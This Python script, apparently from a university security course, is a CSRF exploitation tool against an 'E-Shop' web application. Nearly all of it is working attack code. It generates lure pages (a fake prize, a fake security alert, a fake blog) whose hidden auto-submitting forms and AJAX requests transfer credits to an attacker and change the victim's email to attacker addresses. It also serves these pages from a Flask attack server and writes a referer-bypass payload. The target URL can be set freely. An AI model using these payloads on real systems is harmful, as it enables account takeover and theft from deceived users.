#!/usr/bin/env python3
"""
CSRF (Cross-Site Request Forgery) Exploitation Script for E-Shop
Educational Purpose Only - Part of CDS201 Course

This script demonstrates CSRF vulnerabilities and provides attack tools.
"""

import requests
import sys
import time
from colorama import init, Fore, Style
from flask import Flask, render_template_string, request
import threading
import webbrowser

# Initialize colorama for colored output
init(autoreset=True)

BASE_URL = "http://localhost:8000"


class CSRFExploit:
    def __init__(self, base_url=BASE_URL):
        self.base_url = base_url
        self.attack_server = None
        self.server_thread = None
        
    def test_csrf_endpoints(self):
        """Test if CSRF-vulnerable endpoints are accessible"""
        print(f"{Fore.YELLOW}[*] Testing CSRF-vulnerable endpoints...")
        
        endpoints = [
            '/transfer-credits/',
            '/update-email/',
            '/profile/'
        ]
        
        for endpoint in endpoints:
            try:
                response = requests.get(f"{self.base_url}{endpoint}")
                if response.status_code in [200, 302]:
                    print(f"{Fore.GREEN}[+] Endpoint accessible: {endpoint}")
                else:
                    print(f"{Fore.RED}[-] Endpoint not accessible: {endpoint} (Status: {response.status_code})")
            except Exception as e:
                print(f"{Fore.RED}[-] Error accessing {endpoint}: {e}")
    
    def generate_csrf_poc(self, attack_type="transfer"):
        """Generate CSRF Proof of Concept HTML"""
        
        if attack_type == "transfer":
            poc_html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>You Won ‚Ç¨1000!</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 50px; text-align: center; }}
        .prize {{ 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white; padding: 50px; border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }}
        button {{ 
            background: #4CAF50; color: white; padding: 15px 30px;
            border: none; border-radius: 5px; font-size: 18px;
            cursor: pointer; margin-top: 20px;
        }}
        button:hover {{ background: #45a049; }}
    </style>
</head>
<body>
    <div class="prize">
        <h1>üéâ Congratulations! üéâ</h1>
        <h2>You've Won ‚Ç¨1000!</h2>
        <p>Click below to claim your prize instantly!</p>
        <button onclick="claimPrize()">CLAIM NOW</button>
    </div>
    
    <!-- Hidden CSRF Attack Forms -->
    <form id="csrf-transfer" action="{self.base_url}/transfer-credits/" method="POST" style="display:none">
        <input type="hidden" name="recipient" value="evil_hacker">
        <input type="hidden" name="amount" value="999.99">
    </form>
    
    <form id="csrf-email" action="{self.base_url}/update-email/" method="POST" style="display:none">
        <input type="hidden" name="email" value="stolen@attacker.com">
    </form>
    
    <script>
        // Auto-submit after 3 seconds
        setTimeout(function() {{
            console.log('Executing CSRF attack...');
            document.getElementById('csrf-transfer').submit();
        }}, 3000);
        
        function claimPrize() {{
            alert('Processing your prize...');
            document.getElementById('csrf-transfer').submit();
            setTimeout(function() {{
                document.getElementById('csrf-email').submit();
            }}, 500);
        }}
    </script>
</body>
</html>
"""
        
        elif attack_type == "email":
            poc_html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Important Security Update</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 50px; }}
        .warning {{ background: #ff9800; color: white; padding: 20px; border-radius: 10px; }}
    </style>
</head>
<body>
    <div class="warning">
        <h2>‚ö†Ô∏è Security Alert</h2>
        <p>Your account may be compromised. Please wait while we secure it...</p>
    </div>
    
    <form id="email-hijack" action="{self.base_url}/update-email/" method="POST" style="display:none">
        <input type="hidden" name="email" value="hacker@evil.com">
    </form>
    
    <script>
        // Immediate execution
        window.onload = function() {{
            document.getElementById('email-hijack').submit();
        }};
    </script>
</body>
</html>
"""
        
        elif attack_type == "ajax":
            poc_html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Tech Blog</title>
    <style>
        body {{ font-family: Georgia, serif; margin: 50px; line-height: 1.6; }}
        article {{ max-width: 800px; margin: 0 auto; }}
    </style>
</head>
<body>
    <article>
        <h1>10 Best Python Libraries for 2024</h1>
        <p>In this article, we'll explore the most useful Python libraries...</p>
        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit...</p>
    </article>
    
    <script>
        // Silent CSRF via AJAX
        function silentCSRF() {{
            // Transfer credits
            var xhr1 = new XMLHttpRequest();
            xhr1.open('POST', '{self.base_url}/transfer-credits/', true);
            xhr1.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr1.withCredentials = true;
            xhr1.send('recipient=ajax_thief&amount=50');
            
            // Change email
            var xhr2 = new XMLHttpRequest();
            xhr2.open('POST', '{self.base_url}/update-email/', true);
            xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr2.withCredentials = true;
            xhr2.send('email=ajax@hacker.com');
            
            console.log('CSRF attacks sent via AJAX');
        }}
        
        // Execute after page loads
        setTimeout(silentCSRF, 1000);
    </script>
</body>
</html>
"""
        
        return poc_html
    
    def save_poc_files(self):
        """Save various CSRF PoC files"""
        print(f"{Fore.YELLOW}[*] Generating CSRF PoC files...")
        
        poc_types = {
            'csrf_transfer_poc.html': self.generate_csrf_poc('transfer'),
            'csrf_email_poc.html': self.generate_csrf_poc('email'),
            'csrf_ajax_poc.html': self.generate_csrf_poc('ajax')
        }
        
        for filename, content in poc_types.items():
            with open(filename, 'w') as f:
                f.write(content)
            print(f"{Fore.GREEN}[+] Created: {filename}")
    
    def start_attack_server(self, port=5555):
        """Start a web server to host CSRF attack pages"""
        print(f"{Fore.YELLOW}[*] Starting CSRF attack server on port {port}...")
        
        app = Flask(__name__)
        
        @app.route('/')
        def index():
            return """
            <h1>CSRF Attack Server</h1>
            <h2>Available Attacks:</h2>
            <ul>
                <li><a href="/prize">Fake Prize (Transfer Attack)</a></li>
                <li><a href="/security">Fake Security Alert (Email Change)</a></li>
                <li><a href="/blog">Fake Blog (Silent AJAX)</a></li>
                <li><a href="/multi">Multi-Stage Attack</a></li>
            </ul>
            """
        
        @app.route('/prize')
        def prize_attack():
            return self.generate_csrf_poc('transfer')
        
        @app.route('/security')
        def security_attack():
            return self.generate_csrf_poc('email')
        
        @app.route('/blog')
        def blog_attack():
            return self.generate_csrf_poc('ajax')
        
        @app.route('/multi')
        def multi_attack():
            return f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Loading...</title>
            </head>
            <body>
                <h1>Please wait...</h1>
                
                <!-- Multiple CSRF attacks -->
                <iframe src="{self.base_url}/transfer-credits/" style="display:none" 
                        onload="this.contentDocument.forms[0].submit()"></iframe>
                
                <form id="f1" action="{self.base_url}/transfer-credits/" method="POST">
                    <input name="recipient" value="attacker1">
                    <input name="amount" value="100">
                </form>
                
                <form id="f2" action="{self.base_url}/update-email/" method="POST">
                    <input name="email" value="pwned@evil.com">
                </form>
                
                <script>
                    document.getElementById('f1').submit();
                    setTimeout(() => document.getElementById('f2').submit(), 1000);
                </script>
            </body>
            </html>
            """
        
        @app.route('/success')
        def success():
            return "<h1>Attack Successful!</h1><p>Check the target application.</p>"
        
        # Run Flask in a thread
        self.attack_server = app
        self.server_thread = threading.Thread(
            target=lambda: app.run(port=port, debug=False, use_reloader=False)
        )
        self.server_thread.daemon = True
        self.server_thread.start()
        
        time.sleep(2)  # Give server time to start
        print(f"{Fore.GREEN}[+] Attack server running at http://localhost:{port}")
        print(f"{Fore.YELLOW}[!] Send victims to the attack URLs above")
    
    def demonstrate_csrf_defense_bypass(self):
        """Show how to bypass weak CSRF defenses"""
        print(f"\n{Fore.CYAN}=== CSRF Defense Bypass Techniques ===")
        
        print(f"\n{Fore.YELLOW}1. Referer Header Bypass:")
        print(f"{Fore.CYAN}   - Use data: URL to remove referer")
        print(f"{Fore.CYAN}   - Use meta refresh redirect")
        print(f"{Fore.CYAN}   - Use window.open() with noreferrer")
        
        print(f"\n{Fore.YELLOW}2. Token Prediction (if tokens are weak):")
        print(f"{Fore.CYAN}   - Sequential tokens")
        print(f"{Fore.CYAN}   - Time-based tokens")
        print(f"{Fore.CYAN}   - User-specific but static tokens")
        
        print(f"\n{Fore.YELLOW}3. Method Override:")
        print(f"{Fore.CYAN}   - Try GET instead of POST")
        print(f"{Fore.CYAN}   - Use _method parameter")
        
        bypass_example = """
<!-- Referer bypass using data: URL -->
<html>
<head>
    <meta http-equiv="refresh" content="0; 
          url=data:text/html,<form id='f' action='""" + self.base_url + """/transfer-credits/' 
          method='POST'><input name='recipient' value='attacker'>
          <input name='amount' value='100'></form>
          <script>document.getElementById('f').submit()</script>">
</head>
</html>
"""
        
        with open('csrf_bypass.html', 'w') as f:
            f.write(bypass_example)
        
        print(f"\n{Fore.GREEN}[+] Created csrf_bypass.html with referer bypass")
    
    def automated_scan(self):
        """Run automated CSRF vulnerability scan"""
        print(f"{Fore.CYAN}{Style.BRIGHT}=== Automated CSRF Scan ==={Style.RESET_ALL}")
        
        # Test endpoints
        self.test_csrf_endpoints()
        
        # Generate PoC files
        print(f"\n{Fore.YELLOW}[*] Generating attack files...")
        self.save_poc_files()
        
        # Demonstrate bypasses
        self.demonstrate_csrf_defense_bypass()
        
        # Start attack server
        print(f"\n{Fore.YELLOW}[*] Starting attack server...")
        self.start_attack_server()
        
        print(f"\n{Fore.GREEN}[+] CSRF attack environment ready!")
        print(f"{Fore.YELLOW}[!] Attack URLs:")
        print(f"    - Prize scam: http://localhost:5555/prize")
        print(f"    - Security alert: http://localhost:5555/security")
        print(f"    - Blog post: http://localhost:5555/blog")
        print(f"    - Multi-attack: http://localhost:5555/multi")
        
        print(f"\n{Fore.RED}[!] Victim must be logged into {self.base_url}")


def main():
    """Main function to run CSRF exploits"""
    
    print(f"{Fore.CYAN}{Style.BRIGHT}")
    print("=" * 50)
    print("CSRF Exploitation Tool - E-Shop Application")
    print("Educational Purpose Only - CDS201 Course")
    print("=" * 50)
    print(f"{Style.RESET_ALL}")
    
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        base_url = BASE_URL
    
    exploit = CSRFExploit(base_url)
    
    while True:
        print(f"\n{Fore.CYAN}Select an option:")
        print("1. Run automated CSRF scan")
        print("2. Test CSRF endpoints")
        print("3. Generate PoC files only")
        print("4. Start attack server")
        print("5. Open attack in browser")
        print("6. Show CSRF defense bypasses")
        print("0. Exit")
        
        try:
            choice = input(f"{Fore.YELLOW}Enter choice: {Style.RESET_ALL}")
            
            if choice == "1":
                exploit.automated_scan()
            elif choice == "2":
                exploit.test_csrf_endpoints()
            elif choice == "3":
                exploit.save_poc_files()
            elif choice == "4":
                port = input("Enter port (default 5555): ") or "5555"
                exploit.start_attack_server(int(port))
            elif choice == "5":
                attack_type = input("Attack type (prize/security/blog/multi): ")
                webbrowser.open(f"http://localhost:5555/{attack_type}")
            elif choice == "6":
                exploit.demonstrate_csrf_defense_bypass()
            elif choice == "0":
                print(f"{Fore.GREEN}[+] Exiting...")
                break
            else:
                print(f"{Fore.RED}[-] Invalid choice!")
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Interrupted by user")
            break
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {e}")


if __name__ == "__main__":
    main()